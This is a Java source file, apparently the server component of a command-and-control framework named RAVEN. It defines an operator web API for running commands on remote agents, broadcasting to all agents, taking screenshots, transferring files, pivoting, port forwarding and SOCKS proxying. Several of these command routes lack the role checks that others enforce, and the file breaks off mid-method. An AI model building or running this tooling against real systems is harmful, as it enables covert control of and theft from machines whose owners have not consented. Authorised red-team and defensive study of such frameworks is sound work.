package com.raven.interfaces;

import com.google.gson.Gson;
import com.raven.core.command.ExportCommand;
import com.raven.core.database.TeamDatabase;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.event.EventManager.EventType;
import com.raven.core.output.EventLog;
import com.raven.core.output.Logger;
import com.raven.core.server.ListenerMode;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.APP.api.AuthApi;
import com.raven.interfaces.APP.api.AuthApi.TokenInfo;
import com.raven.interfaces.APP.core.HttpRouter;
import com.raven.interfaces.APP.shared.HttpHelper;
import com.raven.interfaces.APP.shared.PathResolver;
import com.raven.utils.ServerConfig;
import com.raven.utils.SystemHelper;
import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public final class TeamServer {

    private static final long TokenTtlMs = 8L * 60 * 60 * 1000;
    private static final int MaxChatSize = 500;
    private static final String JsonContentType = "application/json";

    @FunctionalInterface
    private interface RouteHandler {
        String Handle(HttpExchange E, TokenInfo T) throws Exception;
    }

    private final ServerConfig Config;
    private final ListenerMode Mode;
    private final TeamDatabase Db;
    private final AuthApi Auth;
    private final EventLog Log;
    private final ExportCommand Export;
    private final PathResolver PathResolver;
    private final Map<String, TokenInfo> Tokens = new ConcurrentHashMap<>();
    private final List<Map<String, Object>> Chat = new CopyOnWriteArrayList<>();
    private final Gson Json = new Gson();

    private RavenServer Server;
    private HttpServer HttpSrv;
    private HttpRouter Router;
    private Instant ServerStartTime;

    public TeamServer(ServerConfig Config, ListenerMode Mode) {
        this.Config = Config;
        this.Mode = Mode;
        this.Db = TeamDatabase.Connect(Config);
        this.Auth = new AuthApi(this.Db);
        this.Log = new EventLog(Config.GetMaxLogEntries());
        this.Export = new ExportCommand(Db, Log);
        this.PathResolver = new PathResolver(TeamServer.class);
    }

    public void Run(String Host, int Port) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 128);
        Router = new HttpRouter(HttpSrv, Config, PathResolver);
        RegisterRoutesOnServer(HttpSrv);
        Router.RegisterStatic();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(32));
        HttpSrv.start();
        Logger.Info("TeamServer web panel : http://" + Host + ":" + Port + "/");
        Logger.Info("API base             : http://" + Host + ":" + Port + "/api/");
        Log.Add("TeamServer initialized — mode: " + Mode.name());
    }

    private volatile HttpServer WebPanelHttpServer = null;
    private volatile String WebPanelHost = null;
    private volatile int WebPanelPort = -1;

    private String ApiWebPanelStart(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
        if (!Token.Role().CanWrite()) return HttpHelper.Json(Map.of("Error", "insufficient permissions"));
        if (WebPanelHttpServer != null) return HttpHelper.Json(Map.of("Error", "web panel already running"));
        Map<String, Object> Body = Body(Exchange);
        String RequestedHost = Str(Body, "Host", "0.0.0.0");
        int RequestedPort = Num(Body, "Port", 8080);
        try {
            HttpServer Panel = HttpServer.create(new InetSocketAddress(RequestedHost, RequestedPort), 64);
            HttpRouter PanelRouter = new HttpRouter(Panel, Config, PathResolver);
            RegisterRoutesOn(PanelRouter);
            PanelRouter.RegisterStatic();
            Panel.setExecutor(Executors.newFixedThreadPool(8));
            Panel.start();
            WebPanelHttpServer = Panel;
            WebPanelHost = RequestedHost;
            WebPanelPort = RequestedPort;
            String DisplayHost = RequestedHost.equals("0.0.0.0") ? "localhost" : RequestedHost;
            String Url = "http://" + DisplayHost + ":" + RequestedPort + "/";
            Logger.Info("Web panel enabled on " + Url + " by " + Token.Username());
            AddLog("Web panel started on " + Url + " by " + Token.Username());
            return HttpHelper.Json(Map.of("Success", true, "URL", Url));
        } catch (Exception Ex) {
            return HttpHelper.Json(Map.of("Error", "web panel start failed: " + Ex.getMessage()));
        }
    }

    private String ApiWebPanelStop(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
        if (!Token.Role().CanWrite()) return HttpHelper.Json(Map.of("Error", "insufficient permissions"));
        if (WebPanelHttpServer == null) return HttpHelper.Json(Map.of("Error", "web panel not running"));
        WebPanelHttpServer.stop(1);
        WebPanelHttpServer = null;
        WebPanelHost = null;
        WebPanelPort = -1;
        Logger.Info("Web panel stopped by " + Token.Username());
        AddLog("Web panel stopped by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiWebPanelStatus(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
        boolean Running = WebPanelHttpServer != null;
        Map<String, Object> Response = new LinkedHashMap<>();
        Response.put("Running", Running);
        if (Running) {
            String DisplayHost = WebPanelHost != null && WebPanelHost.equals("0.0.0.0") ? "localhost" : WebPanelHost;
            Response.put("URL", "http://" + DisplayHost + ":" + WebPanelPort + "/");
            Response.put("Host", WebPanelHost);
            Response.put("Port", WebPanelPort);
        }
        return HttpHelper.Json(Response);
    }

    private String ApiTasks(HttpExchange Exchange, AuthApi.TokenInfo Token) throws Exception {
        return HttpHelper.Json(Map.of("Tasks", List.of()));
    }

    public void Stop() {
        if (Server != null) Server.StopServer();
        if (HttpSrv != null) HttpSrv.stop(1);
        Db.Close();
        Logger.Shutdown();
    }

    public void RunAsBackend(String AgentHost, int AgentPort, String ApiHost, int ApiPort) throws Exception {
        Server = new RavenServer(AgentHost, AgentPort, Mode, Config);
        Server.AddEventListener(this::OnEvent);
        boolean[] Started = Server.StartServer();
        if (!Started[0]) throw new Exception("failed to start agent listener on " + AgentHost + ":" + AgentPort);
        ServerStartTime = Instant.now();
        Thread AcceptThread = new Thread(Server::AcceptConnections, "AcceptConnections");
        AcceptThread.setDaemon(true);
        AcceptThread.start();
        HttpSrv = HttpServer.create(new InetSocketAddress(ApiHost, ApiPort), 128);
        Router = new HttpRouter(HttpSrv, Config, PathResolver);
        RegisterRoutesOnServer(HttpSrv);
        HttpSrv.setExecutor(Executors.newFixedThreadPool(32));
        HttpSrv.start();
        Logger.Info("RAVEN TeamServer backend running:");
        Logger.Info("  Agent listener : " + AgentHost + ":" + AgentPort + " [" + Mode.name() + "]");
        Logger.Info("  Operator API   : http://" + ApiHost + ":" + ApiPort + "/api/");
        Logger.Info("  Connect CLI    : java -jar raven.jar -TSC -ts " + ApiHost + " -tp " + ApiPort);
        Logger.Info("  Connect Web    : java -jar raven.jar -TSW -ts " + ApiHost + " -tp " + ApiPort);
        Log.Add("TeamServer backend initialized — mode: " + Mode.name());
    }

    public void RunStandalone(String AgentHost, int AgentPort, String ApiHost, int TeamPort, int WebPort) throws Exception {
        RunAsBackend(AgentHost, AgentPort, ApiHost, TeamPort);
        HttpServer WebSrv = HttpServer.create(new InetSocketAddress(ApiHost, WebPort), 64);
        HttpRouter WebRouter = new HttpRouter(WebSrv, Config, PathResolver);
        RegisterRoutesOn(WebRouter);
        WebRouter.RegisterStatic();
        WebSrv.setExecutor(Executors.newFixedThreadPool(8));
        WebSrv.start();
        String DisplayHost = ApiHost.equals("0.0.0.0") ? "localhost" : ApiHost;
        Logger.Info("  Web frontend   : http://" + DisplayHost + ":" + WebPort + "/");
        Log.Add("Web frontend started on port " + WebPort);
    }

    private void route(String Path, RouteHandler H, boolean Auth) {
        RouteOn(HttpSrv, Path, H, Auth);
    }

    private void RouteOn(HttpServer Target, String Path, RouteHandler H, boolean Auth) {
        Target.createContext(Path, E -> Dispatch(E, H, Auth));
    }

    private void RegisterRoutesOn(HttpRouter R) {
        RegisterRoutesOnServer(R.GetServer());
    }

    private void RegisterRoutesOnServer(HttpServer Target) {
        RouteOn(Target, "/api/auth/login",  this::ApiAuthLogin, false);
        RouteOn(Target, "/api/auth/logout", this::ApiAuthLogout, true);
        RouteOn(Target, "/api/server/status", this::ApiServerStatus, true);
        RouteOn(Target, "/api/server/start",  this::ApiServerStart,  true);
        RouteOn(Target, "/api/server/stop",   this::ApiServerStop,   true);
        RouteOn(Target, "/api/agents",              this::ApiAgents,      true);
        RouteOn(Target, "/api/agents/kill",         this::ApiAgentKill,   true);
        RouteOn(Target, "/api/agents/note",         this::ApiAgentNote,   true);
        RouteOn(Target, "/api/agents/notes/all",    this::ApiAgentNotesAll, true);
        RouteOn(Target, "/api/command/execute",     this::ApiCmdExec,          true);
        RouteOn(Target, "/api/command/broadcast",   this::ApiCmdBroadcast,     true);
        RouteOn(Target, "/api/command/broadcastall",this::ApiCmdBroadcastAll,  true);
        RouteOn(Target, "/api/command/history",     this::ApiCmdHistory,       true);
        RouteOn(Target, "/api/command/screenshot",  this::ApiCmdScreenshot,    true);
        RouteOn(Target, "/api/command/download",    this::ApiCmdDownload,      true);
        RouteOn(Target, "/api/command/upload",      this::ApiCmdUpload,        true);
        RouteOn(Target, "/api/command/sleep",       this::ApiCmdSleep,         true);
        RouteOn(Target, "/api/command/pivot",       this::ApiCmdPivot,         true);
        RouteOn(Target, "/api/command/portfwd",     this::ApiCmdPortfwd,       true);
        RouteOn(Target, "/api/command/socks",       this::ApiCmdSocks,         true);
        RouteOn(Target, "/api/sessions/history",    this::ApiSessionHistory,   true);
        RouteOn(Target, "/api/logs",                this::ApiLogs,             true);
        RouteOn(Target, "/api/export",              this::ApiExport,           true);
        RouteOn(Target, "/api/team/operators",          this::ApiOpList,     true);
        RouteOn(Target, "/api/team/operators/create",   this::ApiOpCreate,   true);
        RouteOn(Target, "/api/team/operators/delete",   this::ApiOpDelete,   true);
        RouteOn(Target, "/api/team/operators/role",     this::ApiOpRole,     true);
        RouteOn(Target, "/api/team/operators/password", this::ApiOpPassword, true);
        RouteOn(Target, "/api/team/operators/kick",     this::ApiOpKick,     true);
        RouteOn(Target, "/api/team/roles",              this::ApiRoles,      true);
        RouteOn(Target, "/api/server/webpanel/start",   this::ApiWebPanelStart,  true);
        RouteOn(Target, "/api/server/webpanel/stop",    this::ApiWebPanelStop,   true);
        RouteOn(Target, "/api/server/webpanel/status",  this::ApiWebPanelStatus, true);
        RouteOn(Target, "/api/tasks",                   this::ApiTasks,          true);
        RouteOn(Target, "/api/team/chat/send",     this::ApiChatSend,     true);
        RouteOn(Target, "/api/team/chat/messages", this::ApiChatMessages, true);
        RouteOn(Target, "/api/team/chat/logs",     this::ApiChatLogs,     true);
    }

    private void Dispatch(HttpExchange E, RouteHandler H, boolean RequireAuth) {
        try {
            TokenInfo T = null;
            if (RequireAuth) {
                String Header = E.getRequestHeaders().getFirst("Authorization");
                if (Header == null || !Header.startsWith("Bearer ")) {
                    Respond(E, 401, Map.of("Error", "Unauthorized"));
                    return;
                }
                T = Tokens.get(Header.substring(7));
                if (T == null || T.ExpiresAt() < System.currentTimeMillis()) {
                    Respond(E, 401, Map.of("Error", "Token expired or invalid"));
                    return;
                }
            }
            String Result = H.Handle(E, T);
            byte[] Bytes = Result.getBytes("UTF-8");
            E.getResponseHeaders().set("Content-Type", JsonContentType);
            E.getResponseHeaders().set("X-Content-Type-Options", "nosniff");
            E.sendResponseHeaders(200, Bytes.length);
            try (OutputStream Out = E.getResponseBody()) {
                Out.write(Bytes);
            }
        } catch (Exception Ex) {
            try {
                Respond(E, 500, Map.of("Error", Ex.getMessage() != null ? Ex.getMessage() : "Internal error"));
            } catch (Exception Ign) {}
        }
    }

    private void Respond(HttpExchange E, int Status, Object Body) throws IOException {
        byte[] Bytes = HttpHelper.Json(Body).getBytes("UTF-8");
        E.getResponseHeaders().set("Content-Type", JsonContentType);
        E.sendResponseHeaders(Status, Bytes.length);
        try (OutputStream Out = E.getResponseBody()) {
            Out.write(Bytes);
        }
    }

    private Map<String, Object> Body(HttpExchange E) throws Exception {
        try (InputStream In = E.getRequestBody()) {
            byte[] Raw = In.readAllBytes();
            if (Raw.length == 0) return new HashMap<>();
            @SuppressWarnings("unchecked")
            Map<String, Object> M = Json.fromJson(new String(Raw, "UTF-8"), Map.class);
            return M != null ? M : new HashMap<>();
        }
    }

    private String Str(Map<String, Object> DataMap, String Key, String Default) {
        return HttpHelper.Str(DataMap, Key, Default);
    }

    private int Num(Map<String, Object> DataMap, String Key, int Default) {
        return HttpHelper.Num(DataMap, Key, Default);
    }

    private void AddLog(String Msg) {
        Log.Add(Msg, false);
        Db.SaveLog(Msg);
    }

    private String Uptime() {
        if (ServerStartTime == null) return "00:00:00";
        return SystemHelper.FormatUptime(Duration.between(ServerStartTime, Instant.now()).getSeconds());
    }

    //  AUTH

    private String ApiAuthLogin(HttpExchange E, TokenInfo Ignored) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Pass = Str(B, "Password", "");
        if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
        if (!Db.ValidateOperator(User, Pass)) return HttpHelper.Json(Map.of("Error", "Invalid credentials"));
        OperatorRole Role = Db.GetOperatorRole(User);
        Db.UpdateLastSeen(User);
        String Token = UUID.randomUUID().toString().replace("-", "");
        Tokens.put(Token, new TokenInfo(User, Role, System.currentTimeMillis() + TokenTtlMs));
        Logger.Info("[AUTH] Login: " + User + " [" + Role + "]");
        AddLog("[AUTH] Login: " + User + " [" + Role + "]");
        return HttpHelper.Json(Map.of("Token", Token, "Role", Role.name(), "Username", User, "Permissions", Role.PermissionString(), "ExpiresIn", TokenTtlMs / 1000));
    }

    private String ApiAuthLogout(HttpExchange E, TokenInfo T) throws Exception {
        String H = E.getRequestHeaders().getFirst("Authorization");
        if (H != null && H.startsWith("Bearer ")) {
            Tokens.remove(H.substring(7));
            AddLog("[AUTH] Logout: " + T.Username());
        }
        return HttpHelper.Json(Map.of("Success", true));
    }

    //  SERVER

    private String ApiServerStatus(HttpExchange E, TokenInfo T) {
        boolean Up = Server != null && Server.IsRunning();
        Map<String, Object> R = new LinkedHashMap<>();
        R.put("Status", Up ? "Online" : "Offline");
        R.put("Mode", Mode.name());
        R.put("Host", Up ? Server.GetHost() : Config.GetServerHost());
        R.put("Port", Up ? Server.GetPort() : Config.GetServerPort());
        R.put("Agents", Up ? Server.GetSessions().Count() : 0);
        R.put("Uptime", Uptime());
        R.put("Operator", T.Username());
        R.put("Role", T.Role().name());
        R.put("Permissions", T.Role().PermissionString());
        R.put("DbType", Config.GetDatabaseType());
        R.put("DbOnline", Db.IsConnected());
        R.put("LogCount", Log.Count());
        if (Up) R.put("Key", Server.GetKeyBase64());
        return HttpHelper.Json(R);
    }

    private String ApiServerStart(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        if (Server != null && Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server already running"));
        Map<String, Object> B = Body(E);
        String Host = Str(B, "Host", Config.GetServerHost());
        int Port = Num(B, "Port", Config.GetServerPort());
        Server = new RavenServer(Host, Port, Mode, Config);
        Server.AddEventListener(this::OnEvent);
        if (!Server.StartServer()[0]) return HttpHelper.Json(Map.of("Error", "Failed to start listener"));
        ServerStartTime = Instant.now();
        Thread T2 = new Thread(Server::AcceptConnections, "AcceptConnections");
        T2.setDaemon(true);
        T2.start();
        AddLog("Listener started on " + Host + ":" + Port + " by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true, "Host", Host, "Port", Port));
    }

    private String ApiServerStop(HttpExchange E, TokenInfo T) {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Server.StopServer();
        Server = null;
        ServerStartTime = null;
        AddLog("Listener stopped by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    //  AGENTS

    private String ApiAgents(HttpExchange E, TokenInfo T) {
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Agents", List.of()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("AgentName", S.GetAgentName());
            A.put("Hostname", S.GetHostname());
            A.put("OS", S.GetOs());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            A.put("Encrypted", S.IsEncrypted());
            A.put("MtlsEnabled", S.IsMtlsEnabled());
            A.put("SessionKey", S.GetSessionKey());
            A.put("Note", Db.GetAgentNote(S.GetId()));
            Agents.add(A);
        }
        return HttpHelper.Json(Map.of("Agents", Agents, "Count", Agents.size()));
    }

    private String ApiAgentKill(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanKillSession()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        int Id = Num(Body(E), "AgentId", 0);
        if (Id == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        Server.RemoveSession(Id);
        AddLog("[KILL] session-" + Id + " by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiAgentNote(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        String Note = Str(B, "Note", "");
        if (Id == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        Db.SetAgentNote(Id, Note);
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiAgentNotesAll(HttpExchange E, TokenInfo T) {
        return HttpHelper.Json(Map.of("Notes", Db.GetAllAgentNotes()));
    }

    //  COMMANDS

    private String ApiCmdExec(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        String Cmd = Str(B, "Command", "");
        if (Id == 0 || Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Command required"));
        AddLog("[>] [" + T.Username() + "] session-" + Id + " » " + Cmd);
        String[] R = Server.ExecuteCommand(Id, Cmd);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(Id, T.Username(), Cmd, R[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1], "Command", Cmd));
    }

    private String ApiCmdBroadcast(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanBroadcast()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        String Cmd = Str(B, "Command", "");
        if (Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
        @SuppressWarnings("unchecked")
        List<Object> Raw = (List<Object>) B.getOrDefault("AgentIds", List.of());
        List<Integer> Ids = new ArrayList<>();
        for (Object O : Raw)
            try {
                Ids.add((int) Double.parseDouble(O.toString()));
            } catch (Exception Ign) {}
        if (Ids.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentIds required"));
        AddLog("[BROADCAST] [" + T.Username() + "] > " + Ids.size() + " agents » " + Cmd);
        return BuildBroadcastResult(Server.BroadcastCommand(Ids, Cmd), T.Username(), Cmd);
    }

    private String ApiCmdBroadcastAll(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanBroadcast()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        String Cmd = Str(Body(E), "Command", "");
        if (Cmd.isEmpty()) return HttpHelper.Json(Map.of("Error", "Command required"));
        AddLog("[BROADCAST-ALL] [" + T.Username() + "] > " + Server.GetSessions().Count() + " agents » " + Cmd);
        return BuildBroadcastResult(Server.BroadcastAll(Cmd), T.Username(), Cmd);
    }

    private String BuildBroadcastResult(Map<Integer, String[]> Results, String Operator, String Cmd) {
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            Out.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Cmd, En.getValue()[1], Ok);
        }
        return HttpHelper.Json(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiCmdScreenshot(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        int Id = Num(Body(E), "AgentId", 0);
        if (Id == 0 || Server == null) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        String[] R = Server.ExecuteCommand(Id, "screenshot");
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(Id, T.Username(), "screenshot", R[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1]));
    }

    private String ApiCmdDownload(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        String Path = Str(B, "Path", "");
        if (Id == 0 || Path.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Path required"));
        String[] R = Server.ExecuteCommand(Id, "download " + Path);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(Id, T.Username(), "download " + Path, R[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1]));
    }

    private String ApiCmdUpload(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanExecute()) return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        String Local = Str(B, "LocalPath", "");
        String Remote = Str(B, "RemotePath", "");
        if (Id == 0 || Local.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and LocalPath required"));
        String[] R = Server.ExecuteCommand(Id, "upload " + Local + (Remote.isEmpty() ? "" : " " + Remote));
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(Id, T.Username(), "upload " + Local, R[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", R[1]));
    }

    private String ApiCmdSleep(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        String Secs = Str(B, "Seconds", "");
        if (Id == 0 || Secs.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Seconds required"));
        String[] R = Server.ExecuteCommand(Id, "sleep " + Secs);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
    }

    private String ApiCmdPivot(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        String Target = Str(B, "Target", "");
        if (Id == 0 || Target.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Target required"));
        String[] R = Server.ExecuteCommand(Id, "pivot " + Target);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
    }

    private String ApiCmdPortfwd(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        int Lport = Num(B, "Lport", 0);
        String Rhost = Str(B, "Rhost", "");
        int Rport = Num(B, "Rport", 0);
        if (Id == 0 || Lport == 0 || Rhost.isEmpty() || Rport == 0) return HttpHelper.Json(Map.of("Error", "AgentId, Lport, Rhost, Rport required"));
        String[] R = Server.ExecuteCommand(Id, "portfwd " + Lport + " " + Rhost + " " + Rport);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
    }

    private String ApiCmdSocks(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        int Id = Num(B, "AgentId", 0);
        int Lport = Num(B, "Lport", 0);
        if (Id == 0 || Lport == 0) return HttpHelper.Json(Map.of("Error", "AgentId and Lport required"));
        String[] R = Server.ExecuteCommand(Id, "socks " + Lport);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(R[0]), "Output", R[1]));
    }

    private String ApiCmdHistory(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        return HttpHelper.Json(Map.of("History", Db.GetCommandHistory(Num(B, "AgentId", 0), Num(B, "Limit", 100))));
    }

    //  SESSIONS

    private String ApiSessionHistory(HttpExchange E, TokenInfo T) throws Exception {
        int Limit = Num(Body(E), "Limit", 100);
        return HttpHelper.Json(Map.of("Sessions", Db.GetSessionHistory(Math.min(Limit, 1000))));
    }

    //  LOGS

    private String ApiLogs(HttpExchange E, TokenInfo T) {
        return HttpHelper.Json(Map.of("Logs", Log.GetAll(), "Count", Log.Count()));
    }

    //  EXPORT

    private String ApiExport(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        String Target = Str(B, "Target", "");
        String Format = Str(B, "Format", "json");
        if (Target.isEmpty()) return HttpHelper.Json(Map.of("Error", "Target required"));
        Export.Run(Target, Format);
        return HttpHelper.Json(Map.of("Success", true, "Target", Target, "Format", Format));
    }

    //  OPERATORS

    private String ApiOpList(HttpExchange E, TokenInfo T) {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        return HttpHelper.Json(Map.of("Operators", Db.GetOperators()));
    }

    private String ApiOpCreate(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Pass = Str(B, "Password", "");
        String Role = Str(B, "Role", "OPERATOR");
        if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
        if (Pass.length() < 8) return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters"));
        OperatorRole R = OperatorRole.FromString(Role);
        if (R == OperatorRole.SUPER && !T.Role().IsSuperAdmin()) return HttpHelper.Json(Map.of("Error", "Only SUPER can create SUPER"));
        if (!Db.CreateOperator(User, Pass, R)) return HttpHelper.Json(Map.of("Error", "Username already exists"));
        AddLog("[TEAM] Created operator: " + User + " [" + R + "] by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true, "Username", User, "Role", R.name()));
    }

    private String ApiOpDelete(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        String User = Str(Body(E), "Username", "");
        if (User.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot delete admin"));
        if (!Db.DeleteOperator(User)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
        Tokens.entrySet().removeIf(En -> En.getValue().Username().equals(User));
        AddLog("[TEAM] Deleted operator: " + User + " by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiOpRole(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Role = Str(B, "Role", "");
        if (User.isEmpty() || Role.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Role required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot change admin role"));
        OperatorRole R = OperatorRole.FromString(Role);
        if (!Db.UpdateOperatorRole(User, R)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
        AddLog("[TEAM] Role updated: " + User + " → " + R + " by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiOpPassword(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanManage()) return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Pass = Str(B, "Password", "");
        if (User.isEmpty() || Pass.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username and Password required"));
        if (Pass.length() < 8) return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters"));
        if (!Db.UpdateOperatorPassword(User, Pass)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
        AddLog("[TEAM] Password changed: " + User + " by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiOpKick(HttpExchange E, TokenInfo T) throws Exception {
        if (!T.Role().CanKickOperator()) return HttpHelper.Json(Map.of("Error", "SUPER role required"));
        String User = Str(Body(E), "Username", "");
        if (User.isEmpty()) return HttpHelper.Json(Map.of("Error", "Username required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return HttpHelper.Json(Map.of("Error", "Cannot kick admin"));
        if (User.equals(T.Username())) return HttpHelper.Json(Map.of("Error", "Cannot kick yourself"));
        Tokens.entrySet().removeIf(En -> En.getValue().Username().equals(User));
        if (!Db.DeleteOperator(User)) return HttpHelper.Json(Map.of("Error", "Operator not found"));
        AddLog("[TEAM] Kicked: " + User + " by " + T.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiRoles(HttpExchange E, TokenInfo T) {
        List<Map<String, Object>> Roles = new ArrayList<>();
        for (OperatorRole R : OperatorRole.values()) {
            Map<String, Object> M = new LinkedHashMap<>();
            M.put("Name", R.name());
            M.put("Permissions", R.PermissionString());
            M.put("CanExec", R.CanExecute());
            M.put("CanWrite", R.CanWrite());
            M.put("CanRead", R.CanRead());
